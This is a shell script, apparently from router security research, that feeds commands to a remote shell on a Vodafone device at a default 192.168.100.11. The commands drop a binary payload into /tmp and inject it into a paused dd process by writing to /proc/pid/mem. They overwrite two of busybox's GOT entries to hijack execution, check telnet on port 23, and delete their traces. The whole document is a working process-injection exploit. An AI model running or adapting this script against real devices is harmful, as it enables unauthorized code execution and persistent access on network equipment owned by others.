#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
port="${2:-9536}"
image="${IMAGE:-nsm_dbus_probe.bin}"
bootstrap="${BOOTSTRAP:-nsm-ddexec-bootstrap.bin}"

test "$(wc -c <"$image")" -eq 12976
test "$(wc -c <"$bootstrap")" -eq 36

octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')

{
    sleep 3
    printf ': >/tmp/nsm_dbus_probe.bin; /bin/busybox rm -f /tmp/nsm_client.log\n'
    printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do
        printf "printf '%s' >>/tmp/nsm_dbus_probe.bin\n" "$chunk"
    done
    printf "printf '%s' >/tmp/nsm_probe_bootstrap.bin\n" "$boot_octal"
    printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); entry=$image; rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); echo TARGET=$p BASE=$base IMAGE=$image ENTRY=$entry; /bin/dd if=/tmp/nsm_dbus_probe.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; rc1=$?; /bin/dd if=/tmp/nsm_probe_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; rcb=$?; printf "\\$(printf %03o $((entry&255)))\\$(printf %03o $(((entry>>8)&255)))\\$(printf %03o $(((entry>>16)&255)))\\$(printf %03o $(((entry>>24)&255)))" >/tmp/nsm_probe_pointer.bin; /bin/dd if=/tmp/nsm_probe_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; rc2=$?; /bin/dd if=/tmp/nsm_probe_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; rc3=$?; echo IMAGE_RC=$rc1 BOOT_RC=$rcb READ_GOT_RC=$rc2 WRITE_GOT_RC=$rc3; kill -CONT $p; /bin/sleep 3; /bin/cat /tmp/nsm_client.log 2>&1; echo PORT23_STATE; /usr/bin/awk '\''$2~/:0017$/{print}'\'' /proc/net/tcp; for x in /proc/[0-9]*; do c=$(/bin/cat $x/comm 2>/dev/null); case "$c" in *telnet*) echo TELNET_PID=${x#/proc/}; /bin/cat $x/status 2>/dev/null;; esac; done; kill -KILL $p 2>/dev/null || true; /bin/busybox rm -f /tmp/nsm_dbus_probe.bin /tmp/nsm_probe_bootstrap.bin /tmp/nsm_probe_pointer.bin; echo NSM_PROBE_DONE'
    sleep 8
} | timeout 25 ./vodafone-direct-shell.sh "$host" "$port"
